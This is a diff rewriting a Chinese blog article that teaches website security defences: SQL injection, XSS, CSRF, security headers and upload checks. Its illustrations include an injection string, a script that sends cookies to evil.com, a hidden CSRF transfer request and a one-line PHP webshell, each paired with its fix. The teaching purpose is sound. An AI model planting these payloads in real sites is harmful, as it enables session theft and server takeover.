@@ -1,7 +1,188 @@
-title: 网站有哪些常见安全漏洞，如何防范？
+---
+title: 网站常见安全漏洞与防范——2026 年，你的网站还在裸奔吗？
 categories: Web开发
-tags: [网站百科,网站技巧]
+tags: [网络安全,漏洞防范,XSS,SQL注入,CSRF,OWASP,安全头]
 date: 2020-06-11 14:38:20
+updated: 2026-07-24 10:00:00
 id: 0015
 ---
-  <p>随着互联网的发展，每年网站数量也是呈几何级的增长，网络安全问题越来越受到大家重视。一个企业的网站如果出现安全问题，对企业的品牌形象和用户信任度影响非常大，那么我们该如何保障网站的安全问题呢？我们能做的就是在出现问题前做好预防，今天小编来分享一些网站建设中常见的安全漏洞。</p><p><img src="https://www.6mal.com/img/2020/201803061520310749836809.png" /></p><p></p><p>1、明文传输</p><p>问题描述：对系统用户口令保护不足，攻击者可以利用攻击工具，从网络上窃取合法的用户口令数据。</p><p>修改建议：传输的密码必须加密。</p><p>注意：所有密码要加密。要复杂加密。不要用base64或md5。</p><p>2、sql注入</p><p>问题描述：攻击者利用sql注入漏洞，可以获取数据库中的多种信息，如：管理后台的密码，从而脱取数据库中的内容（脱库）。</p><p>修改建议：对输入参数进行过滤、校验。采用黑白名单方式。</p><p>注意：过滤、校验要覆盖系统内所有的参数。</p><p></p><p>3、跨站脚本攻击</p><p>问题描述：对输入信息没有进行校验，攻击者可以通过巧妙的方法注入恶意指令代码到网页。这种代码通常是JavaScript，但实际上，也可以包括Java、VBScript、ActiveX、Flash或者普通的HTML。攻击成功之后，攻击者可以拿到更高的权限。</p><p>修改建议：对用户输入进行过滤、校验。输出进行HTML实体编码。</p><p>注意：过滤、校验、HTML实体编码。要覆盖所有参数。</p><p></p><p>4、文件上传漏洞</p><p>问题描述：没有对文件上传限制，可能会被上传可执行文件，或脚本文件。进一步导致服务器沦陷。</p><p>修改建议：严格验证上传文件，防止上传asp、aspx、asa、php、jsp等危险脚本。同时最好加入文件头验证，防止用户上传非法文件。</p><p></p><p>5、敏感信息泄露</p><p>问题描述：系统暴露内部信息，如：网站的绝对路径、网页源代码、SQL语句、中间件版本、程序异常等信息。</p><p>修改建议：对用户输入的异常字符过滤。屏蔽一些错误回显，如自定义404、403、500等。</p><p></p><p>6、命令执行漏洞</p><p>问题描述：脚本程序调用如php的system、exec、shell_exec等。</p><p>修改建议：打补丁，对系统内需要执行的命令要严格限制。</p><p>7、CSRF（跨站请求伪造）</p><p>问题描述：使用已经登陆用户，在不知情的情况下执行某种动作的攻击。</p><p>修改建议：添加token验证。时间戳或这图片验证码。</p><p>8、SSRF漏洞</p><p>问题描述：服务端请求伪造。</p><p>修改建议：打补丁，或者卸载无用的包</p><p>9、默认口令、弱口令</p><p>问题描述：因为默认口令、弱口令很容易让人猜到。</p><p>修改建议：加强口令强度不适用弱口令</p><p>注意：口令不要出现常见的单词。如：root123456、admin1234、qwer1234、pssw0rd等。</p><p>当然以上这些并不是所有可能出现的漏洞，对于大型网站和企业网站在运营过程中一定要经常检测维护，最好有专门的负责人对网站定期检测维护，确保网站安全。</p>  
+
+我前年帮一个朋友的电商站做安全审计，结果触目惊心：
+
+- 密码用 MD5 存储（MD5 是什么水平的加密？2010 年就被破解了）
+- 没有 CSP 头（攻击者可以直接注入任意脚本）
+- 后台地址是 `/admin`（三天内被扫描到了 200 多次尝试登录）
+- 文件上传不做类型校验（意味着上传一个 PHP 文件就能直接 getshell）
+
+他说："这样用了 5 年，没出过事啊。"
+
+我说："不是没出事，是**还没有人认真地来搞你。**"
+
+**一句话理解：** 网站安全不是"会不会被攻击"的问题，是"什么时候被攻击"的问题——你能做的，是让攻击者觉得搞你太麻烦，转而去找下一个目标。
+
+## OWASP Top 10：行业公认的安全清单
+
+OWASP（开放Web应用程序安全项目）每年发布一次 Top 10 安全风险列表。这是行业通用的安全参考标准。以下是 2026 年最需要关注的几类：
+
+| 风险 | 严重程度 | 常见场景 |
+|------|---------|---------|
+| 注入攻击（含 SQL 注入） | 🔴 高危 | 搜索框、登录框 |
+| 认证失效 | 🔴 高危 | 弱密码、Session 固定 |
+| XSS（跨站脚本） | 🔴 高危 | 评论区、用户输入展示 |
+| 敏感数据泄露 | 🟡 中危 | 密码明文传输、日志泄漏 |
+| 访问控制缺陷 | 🟡 中危 | 越权访问后台 |
+| SSRF（服务端请求伪造） | 🟡 中危 | 图片下载、URL 抓取功能 |
+
+下面展开最常见的几种。
+
+## 1. SQL 注入：最古老也最致命的漏洞
+
+攻击者在输入框里写一段 SQL 代码，如果后端没做处理，这个 SQL 就会在数据库里执行。
+
+```sql
+-- 正常输入：输入 username = "admin"
+SELECT * FROM users WHERE username = 'admin';
+
+-- 恶意输入：输入 username = "admin' OR '1'='1"
+SELECT * FROM users WHERE username = 'admin' OR '1'='1';
+-- 这条 SQL 会返回所有用户，登录验证就失效了
+```
+
+**正确做法：使用参数化查询（Prepared Statement）**
+
+```php
+// ❌ 错误：拼接 SQL
+$sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
+
+// ✅ 正确：参数化查询
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$_POST['username']]);
+```
+
+> **经验之谈：** 我曾经在一个老项目里发现了一百多处拼接 SQL——那是十年前一个外包团队写的。全部改成参数化查询花了我整整一周。从那次之后我给自己定了个规矩：**项目中不允许出现任何拼接 SQL，所有数据库操作必须用 ORM 或参数化查询。**
+
+## 2. XSS（跨站脚本攻击）：评论区是重灾区
+
+```html
+<!-- 攻击者在评论区写入： -->
+<script>
+  // 偷取用户的 cookie
+  document.location='https://evil.com/steal?cookie='+document.cookie;
+</script>
+
+<!-- 如果输出时没有做 HTML 实体编码，所有看这条评论的用户都会中招 -->
+```
+
+**正确做法：对输出做 HTML 实体编码**
+
+```html
+<!-- 在服务器端对输出做编码 -->
+
+<!-- 原始输入：<script>alert('xss')</script> -->
+<!-- 编码后输出：&lt;script&gt;alert('xss')&lt;/script&gt; -->
+
+<!-- 后者在浏览器里只会显示为普通文字，不会执行 -->
+```
+
+另外一种更强大的防御是 **Content Security Policy（CSP）**——直接告诉浏览器"这个页面只允许加载哪些来源的脚本"：
+
+```nginx
+# Nginx 配置 CSP 头
+add_header Content-Security-Policy "
+  default-src 'self';
+  script-src 'self' https://cdn.example.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' https:;
+" always;
+```
+
+CSP 的效果是：**即使攻击者注入了 `<script>` 标签，浏览器也不会执行——因为 CSP 说"不要执行来自这个来源的脚本"。**
+
+## 3. CSRF（跨站请求伪造）：借你的手干坏事
+
+你登录了银行网站（没退出），然后访问了一个恶意网站。恶意网站偷偷发了一个请求：
+
+```html
+<!-- 攻击者页面里隐藏的图片 -->
+<img src="https://bank.com/transfer?amount=10000&to=attacker">
+
+<!-- 因为你的登录 cookie 还在，浏览器会带上 cookie 发送这个请求 -->
+<!-- 银行收到请求，认为是你本人操作，转了 10000 块 -->
+```
+
+**正确做法：使用 SameSite Cookie**
+
+```php
+// PHP 设置 SameSite Cookie
+setcookie("session", $session_id, [
+    'samesite' => 'Strict',  // 或 'Lax'
+    'secure' => true,
+    'httponly' => true,
+]);
+```
+
+`SameSite=Strict` 意味着：**只有在用户直接访问本站时才会发送 cookie**，从其他网站点击链接或提交表单时不会带 cookie。这个属性 2026 年已经被所有主流浏览器支持了。
+
+## 4. 安全头清单：一行配置顶得上千行代码
+
+以下安全响应头，每一行都能防御一类攻击：
+
+```nginx
+# Nginx 安全头配置
+add_header X-Frame-Options "SAMEORIGIN" always;           # 防止点击劫持（别人用 iframe 嵌入你的网站）
+add_header X-Content-Type-Options "nosniff" always;        # 防止 MIME 类型混淆攻击
+add_header X-XSS-Protection "0" always;                    # 废弃了，设为 0 避免问题
+add_header Referrer-Policy "strict-origin-when-cross-origin" always;  # 控制 Referer 发送策略
+add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;  # 禁用不必要的 API
+add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;  # 强制 HTTPS
+```
+
+## 5. 文件上传：最容易忽略的后门
+
+文件上传功能几乎是每个网站都会有的（头像、附件、图片）。如果对上传的文件不做严格检查，攻击者可以上传一个 PHP webshell：
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+**防御措施：**
+
+```php
+// 1. 检查文件扩展名（白名单比黑名单靠谱）
+$allowed = ['jpg', 'png', 'gif', 'webp'];
+$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+if (!in_array($ext, $allowed)) {
+    die('不允许的文件类型');
+}
+
+// 2. 检查文件内容头（MIME Type）
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mime = finfo_file($finfo, $uploaded_file);
+if (strpos($mime, 'image/') !== 0) {
+    die('只允许上传图片');
+}
+
+// 3. 上传目录不要有执行权限
+// Nginx 取消上传目录的脚本执行权限
+location /uploads {
+    location ~ \.php$ { deny all; }
+}
+```
+
+## 还有几个底线
+
+| 事项 | 正确做法 | 错误做法 |
+|------|---------|---------|
+| 密码存储 | bcrypt/argon2 | MD5/SHA1/base64 |
+| 传输加密 | HTTPS（Let's Encrypt） | HTTP |
+| 后台地址 | 自定义路径如 `/dashboard` | 默认 `/admin` |
+| 错误信息 | 自定义错误页 | 暴露堆栈信息 |
+| 依赖安全 | 定期 `npm audit` / `composer audit` | 从不更新 |
+
+## 相关推荐
+
+- [什么是 SSL 和 HTTPS？——网站加密入门](/archives/0026/)
+- [对付 DDoS 攻击的现代防御策略](/archives/0036/)
+- [网站基础术语入门——安全部分](/archives/0018/)
+
+**P.S.** 回到开头那个朋友的故事——那次安全审计之后，我帮他修了所有漏洞。两周后，他又被扫描攻击了一次，但这次攻击者只扫到了 403 和 404。攻击者放弃了。**安全不是要做到 100% 攻不破——做到 99% 的攻击者觉得"太麻烦"，你就已经赢了。**
